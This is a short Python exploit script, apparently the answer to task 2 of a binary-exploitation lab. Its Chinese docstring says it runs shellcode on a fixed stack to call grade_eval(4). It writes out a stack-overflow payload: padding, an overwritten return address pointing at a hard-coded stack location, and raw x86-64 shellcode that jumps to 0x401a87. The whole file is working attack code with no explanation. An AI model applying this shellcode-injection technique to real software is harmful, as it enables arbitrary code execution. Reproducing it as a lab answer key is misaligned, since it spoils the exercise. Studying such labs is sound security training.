#!/usr/bin/env python3
"""Task 2: 在固定栈上执行 shellcode 调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

shellcode  = b"\xbf\x04\x00\x00\x00"
shellcode += b"\x48\x83\xec\x18"
shellcode += b"\x68" + p32(0x401a87)
shellcode += b"\xc3"

payload  = b"A" * 8
payload += p64(0x4141414141414141)
payload += b"B" * 8
payload += p64(0x721000800ff0)
payload += shellcode

sys.stdout.buffer.write(payload)
